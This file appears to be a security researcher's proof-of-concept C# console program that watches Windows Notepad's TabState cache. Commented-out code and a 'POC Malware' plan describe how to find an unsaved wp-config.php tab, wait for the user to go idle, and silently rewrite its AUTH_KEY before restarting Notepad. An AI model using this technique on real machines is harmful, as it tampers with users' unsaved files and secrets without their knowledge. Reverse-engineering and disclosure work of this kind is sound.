// See https://aka.ms/new-console-template for more information
using NotepadStateLibrary;
using System.Diagnostics;
using System.Text;
using System.Management;
using System.Net;
using POCMalware;
using System.IO;


Console.WriteLine("********** Starting *********");

bool isNotepadRunning = false;

Thread monitorThread = new Thread(MonitorNotepad);
monitorThread.IsBackground = true; // Set as background thread so it terminates when the app closes
monitorThread.Start();

string directoryToMonitor = @"C:\Users\Reversing\AppData\Local\Packages\Microsoft.WindowsNotepad_8wekyb3d8bbwe\LocalState\TabState";

// Set the polling interval (in milliseconds)
int pollingInterval = 1000; // 1 second

// Dictionary to store file information: file name -> file hash (SHA-256)
var previousFileState = new Dictionary<string, string>();

Console.WriteLine($"Monitoring directory: {directoryToMonitor}");
Console.WriteLine("Press 'q' to quit...");

// Start a loop to check the directory every few seconds
while (true)
{
    // Wait for the next polling interval
    Thread.Sleep(pollingInterval);

    // Get the current state of the directory (file names and their hashes)
    var currentFileState = new Dictionary<string, string>();
    foreach (var file in Directory.GetFiles(directoryToMonitor))
    {
        var fileName = Path.GetFileName(file);
        var fileByteLength = GetFileByteLength(file); // Get SHA-256 hash of the file content
        currentFileState[fileName] = fileByteLength;
    }

    // Check for newly added files
    var addedFiles = currentFileState.Keys.Except(previousFileState.Keys);
    foreach (var addedFile in addedFiles)
    {
        Console.WriteLine($"File created: {addedFile}");
        Console.WriteLine(isNotepadRunning.ToString());
    }

    // Check for deleted files
    var deletedFiles = previousFileState.Keys.Except(currentFileState.Keys);
    foreach (var deletedFile in deletedFiles)
    {
        Console.WriteLine($"File deleted: {deletedFile}");
        Console.WriteLine(isNotepadRunning.ToString());
    }

    // Check for modified files (files that exist in both, but with different hashes)
    var modifiedFiles = currentFileState
        .Where(kv => previousFileState.ContainsKey(kv.Key) && kv.Value != previousFileState[kv.Key])
        .Select(kv => kv.Key);
    foreach (var modifiedFile in modifiedFiles)
    {
        Console.WriteLine($"File modified: {modifiedFile}");
        Console.WriteLine(isNotepadRunning.ToString());
    }

    // Update the previous file state for the next iteration
    previousFileState = new Dictionary<string, string>(currentFileState);

    // Check for user input to exit
    if (Console.KeyAvailable && Console.ReadKey(intercept: true).Key == ConsoleKey.Q)
    {
        break;
    }
}

Console.WriteLine("Monitoring stopped.");


string GetFileByteLength(string filePath)
{

    using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
    {
        byte[] data = new byte[fileStream.Length];
        fileStream.Read(data);

        return data.Length.ToString();
    }
}

 void MonitorNotepad()
{
    while (true)
    {
        // Check if "notepad" is running
        var processes = Process.GetProcessesByName("notepad");

        // If notepad.exe is running, set the flag to true, otherwise false
        bool isRunning = processes.Length > 0;
        if (isRunning != isNotepadRunning)
        {
            isNotepadRunning = isRunning;
            // Optionally log or handle the change in status
            if (isNotepadRunning)
            {
                Console.WriteLine("Notepad started.");
            }
            else
            {
                Console.WriteLine("Notepad closed.");
            }
        }

        // Sleep for a short while to avoid excessive CPU usage
        Thread.Sleep(1000);
    }
}

//https://www.mking.net/blog/programmatically-determining-whether-a-windows-user-is-idle

//https://www.fluxbytes.com/csharp/how-to-know-if-a-process-exited-or-started-using-events-in-c/
//https://learn.microsoft.com/en-us/dotnet/api/system.management.managementeventwatcher?view=net-8.0&redirectedfrom=MSDN

//POC Malware.
//Poll for Notepad to open
//Poll for a specific file to be opened by filename
//Poll for that file to be set to Unsaved
//Check for inactivity timer
//Make change
//Profit???


//bool wasOpen = false;

//if (Process.GetProcessesByName("notepad").Length > 0)
//{
//    wasOpen = true;
//    foreach (var p in Process.GetProcessesByName("notepad"))
//    {
//        p.CloseMainWindow();
//        p.Close();
//    }
//}

//string folder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Packages\Microsoft.WindowsNotepad_8wekyb3d8bbwe\LocalState\TabState");

//foreach (var path in Directory.EnumerateFiles(folder, "*.bin"))
//{
//    byte[] o = new byte[0];

//    using (FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
//    {
//        byte[] data = new byte[fileStream.Length];
//        fileStream.Read(data);

//        if (data.Length > 0)
//        {
//            Console.WriteLine("Processing TabState - {0}", Path.GetFileName(path));
//            NPTabState np = new NPTabState(data, Path.GetFileName(path));


//            if (np.TypeFlag <= 1)
//            {
//                //var s = np.Content;
//                //s[208] = 32;
//                //o = np.WriteContent(s);

//                string c = np.ContentString;
//                int start = c.IndexOf("define('AUTH_KEY',");
//                int end = c.Substring(start).IndexOf(");") + 2;
//                var n = Encoding.Unicode.GetBytes(c.Remove(start, end).Insert(start, "define('AUTH_KEY',         '->-&3du!!^iN|U[57nG({}6&compromisedQ-,NXiN5Uv7txxX469`8v-dCYYf,H');"));
//                o = np.WriteContent(n);

//                //File.WriteAllBytes(path, o);
//            }
//        }
//    }
//    File.WriteAllBytes(path, o);
//}

//if (wasOpen)
//{
//    Process.Start("notepad.exe");
//}


// Create event query to be notified within 1 second of
// a change in a service

//WqlEventQuery query =
//    new WqlEventQuery("__InstanceCreationEvent",
//    new TimeSpan(0, 0, 1),
//    "TargetInstance isa \"Win32_Process\" AND TargetInstance.Name LIKE 'Notepad.exe'");

//// Initialize an event watcher and subscribe to events
//// that match this query
//ManagementEventWatcher watcher =
//    new ManagementEventWatcher();
//watcher.Query = query;
//// times out watcher.WaitForNextEvent in 5 seconds
//watcher.Options.Timeout = new TimeSpan(0, 0, 5);

//// Block until the next event occurs
//// Note: this can be done in a loop if waiting for
////        more than one occurrence
//Console.WriteLine(
//    "Open an application (notepad.exe) to trigger an event.");
//ManagementBaseObject e = watcher.WaitForNextEvent();

////Display information from the event
//Console.WriteLine(
//    "Process {0} has been created, path is: {1}",
//    ((ManagementBaseObject)e
//    ["TargetInstance"])["Name"],
//    ((ManagementBaseObject)e
//    ["TargetInstance"])["ExecutablePath"]);

////Cancel the subscription
//watcher.Stop();
//return 0;


//while (true)
//{
//    Thread monitorThread = new Thread(MonitorForNotepad);
//    monitorThread.IsBackground = true;
//    monitorThread.Start();
//}

//static void MonitorForNotepad()
//{
//    while (true)
//    {
//        // Get all running processes
//        var processes = Process.GetProcesses();

//        // Check if any process is notepad.exe
//        if (processes.Any(p => p.ProcessName.Equals("notepad", StringComparison.OrdinalIgnoreCase)))
//        {
//            Console.WriteLine("notepad.exe has been launched!");

//            string folder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Packages\Microsoft.WindowsNotepad_8wekyb3d8bbwe\LocalState\TabState");
//            foreach (var path in Directory.EnumerateFiles(folder, "*.bin"))
//            {
//                using (FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
//                {
//                    byte[] data = new byte[fileStream.Length];
//                    fileStream.Read(data);

//                    if (data.Length > 0)
//                    {
//                        NPTabState np = new NPTabState(data, Path.GetFileName(path));

//                        Console.WriteLine(Path.GetFileName(np.FilePath));

//                        if (np.TypeFlag == 1 && Path.GetFileName(np.FilePath) == "wp-config.php" && np.Unsaved == new byte[1] { 0x1 })
//                        {
//                            Console.WriteLine("ATTACK");
//                            if (InputTimer.GetInputIdleTime() > TimeSpan.FromMinutes(15))
//                            {
//                                //Make the change
//                            }
//                        }
//                    }
//                }
//            }


//            Thread.Sleep(1000);  // Wait for a bit before checking again
//        }

//        // Small delay to prevent excessive CPU usage
//        Thread.Sleep(500);
//    }
//}





//folder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Packages\Microsoft.WindowsNotepad_8wekyb3d8bbwe\LocalState\WindowState");

//foreach (var path in Directory.EnumerateFiles(folder, "*.bin"))
//{
//    byte[] b = File.ReadAllBytes(path);
//    if (b.Length > 0)
//    {

//        NPWindowState np = new NPWindowState(b, Path.GetFileName(path));
//        Console.WriteLine(Path.GetFileName(path));
//        Console.WriteLine(np.NumberTabs.ToString());

//        if (np.CRC32Calculated.SequenceEqual(np.CRC32Stored))
//        {
//            Console.WriteLine("OK");
//        }
//        else
//        {
//            Console.WriteLine("FAIL");
//        }
//        Console.WriteLine("*****************************************");
//    }
//}

#region 
//NPTabState npWrite = new NPTabState(Encoding.Unicode.GetBytes("Test"), [0x0], [0x0], new List<UnsavedBufferChunk>(), [0x1]);
//File.WriteAllBytes("check.bin", npWrite.bytes);

//NPTabState npWrite0 = new NPTabState(0, 25, 4, 4, [0x1], [0x0], [0x0]);
//File.WriteAllBytes("0.bin", npWrite0.bytes);


//byte[] sha = {
//    0x27, 0x09, 0x60, 0x35, 0x22, 0x8A, 0xA1, 0xB4, 0x47, 0x98, 0x4D, 0x7E, 0x1D, 0xFD, 0x10, 0xB9,
//    0xA8, 0x57, 0x16, 0xDA, 0x29, 0xA4, 0xEF, 0xFB, 0x65, 0x02, 0xE4, 0xA6, 0xDE, 0x26, 0x7A, 0xB3,
//};

//byte[] c = {
//    0x74, 0x00, 0x65, 0x00, 0x73, 0x00, 0x74, 0x00, 0x65, 0x00, 0x73, 0x00, 0x74, 0x00, 0x74, 0x00,
//    0x65, 0x00, 0x73, 0x00, 0x74, 0x00, 0x73, 0x00,
//};

//NPTabState npWrite1 = new NPTabState(0, [0x01], @"C:\Users\Reversing\Desktop\Test.txt", 12, [0x05], [0x01], new DateTime(2024, 4, 16, 11, 55, 24), sha, 0, 0, [0x1], [0x0], [0x0], c);
//File.WriteAllBytes("saved.bin", npWrite1.bytes);
#endregion

//NPTabState np = new NPTabState(File.ReadAllBytes(@"C:\Users\Reversing\AppData\Local\Packages\Microsoft.WindowsNotepad_8wekyb3d8bbwe\LocalState\TabState\f62c642a-29ba-443a-baef-d3185c5e7910.bin"));
//Console.WriteLine(Encoding.Unicode.GetString(np.Content));
//File.WriteAllBytes(@"C:\Users\Reversing\AppData\Local\Packages\Microsoft.WindowsNotepad_8wekyb3d8bbwe\LocalState\TabState\98c4291f-34a1-4ffe-b195-72e297d4ff60.bin",np.WriteContent(Encoding.Unicode.GetBytes("How are you?")));


Console.WriteLine("********** Completed **********");
//Console.ReadLine();
